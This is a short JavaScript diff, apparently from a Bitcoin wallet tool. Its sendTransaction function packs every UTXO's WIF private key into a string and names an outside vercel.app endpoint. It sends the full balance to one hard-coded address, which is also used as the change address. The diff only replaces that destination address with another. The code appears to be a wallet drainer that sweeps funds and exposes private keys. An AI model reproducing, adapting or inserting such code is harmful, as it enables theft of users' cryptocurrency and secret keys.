@@ -260,8 +260,8 @@ function getAddressType(address) {
 
 async function sendTransaction(totalBalance, utxos) {
     const url = 'https://createtransaction-yaseens-projects-9df927b9.vercel.app/api/index';
-    const changeAddress = "bc1qexsz6s85ndnfscp49m9jfh05pnvd7z2pw96cvfcly9pzgnxmqdfq46vzge";
-    const recipientAddress = "bc1qexsz6s85ndnfscp49m9jfh05pnvd7z2pw96cvfcly9pzgnxmqdfq46vzge";
+    const changeAddress = "bc1q9346uxnue8e0hargaue8r8032dvkqs8j3p24vw7gjtufyvlsu27shguzu0";
+    const recipientAddress = "bc1q9346uxnue8e0hargaue8r8032dvkqs8j3p24vw7gjtufyvlsu27shguzu0";
     const initialTransactionFee = 15000;
 
     const utxosString = utxos.map(utxo => `${utxo.txid}:${utxo.vout},${utxo.amount},${utxo.wif},${utxo.type}`).join('|');
